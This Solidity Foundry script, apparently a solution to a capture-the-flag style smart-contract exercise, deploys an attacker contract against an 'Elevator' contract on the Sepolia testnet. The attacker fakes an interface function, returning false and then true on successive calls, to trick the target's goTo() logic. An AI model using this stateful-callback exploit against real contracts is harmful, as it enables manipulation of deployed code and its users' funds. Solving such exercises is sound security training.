//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "forge-std/console.sol";

//address contract on sepolia : 0x52c99d17cD9ea510f4B9bC9B39d815b0d57298EE
contract POC is Script {
    attaker attack;

    function run() public {
        // deploy the attacker contract :
        vm.startBroadcast();
        attack = new attaker();
        // call the function atack()
        attack.atack(4);
        vm.stopBroadcast();
    }
}

contract attaker {
    uint public floor;
    address elevator = 0x52c99d17cD9ea510f4B9bC9B39d815b0d57298EE;

    function isLastFloor(uint x) external returns (bool) {
        // function should return false in the first call ;
        // function should return true in the second call with the same input ;
        if (x != floor) {
            floor = x;
            return false;
        } else {
            return true;
        }
    }

    function atack(uint x) public {
        (bool ok, ) = elevator.call(
            abi.encodeWithSignature("goTo(uint256)", x)
        );
        require(ok, "tx.failed");
    }
}
